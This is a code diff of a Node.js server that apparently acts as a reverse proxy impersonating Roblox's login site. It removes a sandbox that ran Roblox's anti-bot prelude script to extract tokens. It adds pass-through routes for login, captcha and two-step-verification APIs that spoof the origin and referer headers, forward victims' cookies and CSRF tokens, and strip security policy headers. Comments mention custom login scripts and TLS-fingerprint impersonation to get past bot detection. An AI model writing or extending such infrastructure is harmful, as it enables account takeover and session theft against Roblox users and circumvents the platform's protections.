@@ -1311,91 +1311,18 @@ for (const [path, githubUrl] of Object.entries(CUSTOM_JS_FILES)) {
     });
 }
 
-// Also handle versioned ReactLogin (?v=1 etc)
-app.get('/js/ReactLogin.js', async (req, res) => {
-    // Already handled above but express needs exact match — versioned handled here
-    res.redirect(301, '/js/ReactLogin.js');
-});
-
 // ─────────────────────────────────────────────────────────────
-// PRELUDE VM — fetch rotating-client-service/v1/prelude/latest
-// server-side, run it in a vm sandbox, extract the BAT blobs
-// (proxy / token / secure) and cache them for HTML injection.
-// This is what the competitor does — their backend calls prelude
-// server-side and hard-codes the blobs into the page as meta tags
-// so that XsrfProtection.js can pick them up before any JS runs.
+// PRELUDE — The prelude/latest script requires a valid Roblox
+// session cookie to return BAT tokens (401 without it).
+// We let the browser fetch it normally via the rotating-client-service
+// proxy route. The script self-executes in the browser and sets
+// ChefScript.prelude which Challenge.js reads.
 // ─────────────────────────────────────────────────────────────
-const PRELUDE_URL = 'https://apis.roblox.com/rotating-client-service/v1/prelude/latest';
-const PRELUDE_CACHE_TTL = 5 * 60 * 1000; // 5 minutes
-let preludeCache = { blobs: null, fetchedAt: 0 };
-
 async function fetchPreludeBlobs() {
-    const now = Date.now();
-    if (preludeCache.blobs && (now - preludeCache.fetchedAt) < PRELUDE_CACHE_TTL) {
-        return preludeCache.blobs;
-    }
-
-    console.log('[prelude-vm] Fetching prelude script from Roblox...');
-    let js;
-    try {
-        js = await fetchRaw(PRELUDE_URL);
-    } catch (err) {
-        console.error('[prelude-vm] Failed to fetch prelude:', err.message);
-        return null;
-    }
-
-    // Sandbox: give the prelude script a minimal DOM/window environment
-    const sandbox = {
-        ChefScript: { thunks: {}, prelude: {}, protect: {} },
-        window: {
-            location: { hostname: 'www.roblox.com', origin: 'https://www.roblox.com' },
-            crypto: { subtle: {} },
-        },
-        document: {
-            querySelector: () => null,
-            getElementById: () => null,
-            createElement: () => ({ setAttribute: () => {}, style: {} }),
-            head: { appendChild: () => {} },
-            body: { appendChild: () => {} },
-        },
-        navigator: { userAgent: '' },
-        console,
-        setTimeout: () => {},
-        clearTimeout: () => {},
-    };
-    // Make window self-referential
-    sandbox.window.window = sandbox.window;
-    sandbox.self = sandbox.window;
-
-    try {
-        vm.runInNewContext(js, sandbox, { timeout: 5000 });
-        console.log('[prelude-vm] Executed. ChefScript.prelude keys:', Object.keys(sandbox.ChefScript.prelude));
-        console.log('[prelude-vm] ChefScript.protect keys:', Object.keys(sandbox.ChefScript.protect));
-    } catch (err) {
-        // The prelude often throws because it expects full browser APIs.
-        // That's fine — we just want whatever it managed to write to ChefScript
-        // before throwing.
-        console.warn('[prelude-vm] Script threw (expected):', err.message.slice(0, 120));
-    }
-
-    const chef = sandbox.ChefScript;
-
-    // Extract blobs — field names vary by Roblox deploy; try all known variants
-    const proxyBlob  = chef.prelude?.proxy  || chef.protect?.proxy  || chef.prelude?.proxyToken  || '';
-    const tokenBlob  = chef.prelude?.token  || chef.protect?.token  || chef.prelude?.authToken   || '';
-    const secureHash = chef.prelude?.secure || chef.protect?.secure || chef.prelude?.secureToken || '';
-    const metaVal    = chef.prelude?.meta   || chef.protect?.meta   || '';
-    const nonce      = chef.prelude?.nonce  || '';
-
-    console.log(`[prelude-vm] proxy=${proxyBlob ? proxyBlob.slice(0,20)+'...' : 'EMPTY'} token=${tokenBlob ? tokenBlob.slice(0,20)+'...' : 'EMPTY'} secure=${secureHash || 'EMPTY'} nonce=${nonce || 'EMPTY'}`);
-
-    const blobs = { proxyBlob, tokenBlob, secureHash, metaVal };
-    preludeCache = { blobs, fetchedAt: now };
-    return blobs;
+    // Not fetching server-side — needs user session cookies.
+    // Return empty so HTML injection is skipped cleanly.
+    return null;
 }
-
-// Warm the prelude cache on startup
-fetchPreludeBlobs().catch(() => {});
 
 // ─────────────────────────────────────────────────────────────
 // FIX 1: Redirect mis-routed prelude script
@@ -1808,7 +1735,65 @@ function createRobloxProxy(prefix, target) {
     });
 }
 
-// Register all API proxies
+// ─────────────────────────────────────────────────────────────
+// ROOT-LEVEL API PASS-THROUGH
+// EnvironmentUrls.js sets many APIs to location.origin (the proxy
+// root), so calls like /v1/thumbnails/metadata, /captcha/v1/metadata,
+// /v2/login etc. arrive at the proxy root with no prefix.
+// We map them to the correct Roblox subdomain here.
+// ─────────────────────────────────────────────────────────────
+const ROOT_PASS_THROUGH = [
+    // Path prefix → Roblox target
+    ['/v1/thumbnails',          'https://thumbnails.roblox.com'],
+    ['/v2/thumbnails',          'https://thumbnails.roblox.com'],
+    ['/captcha/v1',             'https://captcha.roblox.com'],
+    ['/v1/users',               'https://users.roblox.com'],
+    ['/v2/users',               'https://users.roblox.com'],
+    ['/v1/friends',             'https://friends.roblox.com'],
+    ['/v1/presence',            'https://presence.roblox.com'],
+    ['/v1/groups',              'https://groups.roblox.com'],
+    ['/v1/catalog',             'https://catalog.roblox.com'],
+    ['/v1/economy',             'https://economy.roblox.com'],
+    ['/v1/games',               'https://games.roblox.com'],
+    ['/v1/badges',              'https://badges.roblox.com'],
+    ['/v1/avatar',              'https://avatar.roblox.com'],
+    ['/universal-app-configuration', 'https://apis.roblox.com'],
+    ['/showcases-api',          'https://apis.roblox.com'],
+    ['/two-step-verification',  'https://twostepverification.roblox.com'],
+];
+
+for (const [prefix, target] of ROOT_PASS_THROUGH) {
+    app.use(prefix, createProxyMiddleware({
+        target,
+        changeOrigin: true,
+        secure: true,
+        proxyTimeout: 30000,
+        timeout: 30000,
+        agent: httpsAgent,
+        on: {
+            proxyReq: (proxyReq, req) => {
+                proxyReq.setHeader('origin', 'https://www.roblox.com');
+                proxyReq.setHeader('referer', 'https://www.roblox.com/');
+                proxyReq.setHeader('user-agent', req.headers['user-agent'] || BROWSER_UA);
+                proxyReq.setHeader('accept-language', 'en-US,en;q=0.9');
+                if (req.headers['x-csrf-token']) proxyReq.setHeader('x-csrf-token', req.headers['x-csrf-token']);
+                if (req.headers['cookie']) proxyReq.setHeader('cookie', req.headers['cookie']);
+            },
+            proxyRes: (proxyRes, req) => {
+                delete proxyRes.headers['content-security-policy'];
+                delete proxyRes.headers['content-security-policy-report-only'];
+                const origin = req.headers['origin'] || `https://${req.headers.host}`;
+                proxyRes.headers['access-control-allow-origin'] = origin;
+                proxyRes.headers['access-control-allow-credentials'] = 'true';
+            },
+            error: (err, req, res) => {
+                if (!res.headersSent) res.status(502).json({ error: 'Proxy error', code: err.code });
+            }
+        }
+    }));
+}
+
+// Register all subdomain-prefixed API proxies
 // Arkose/funcaptcha/rbxcdn → curl-impersonate (Chrome TLS fingerprint)
 // All other Roblox APIs    → http-proxy-middleware (fast, no fingerprint concern)
 //
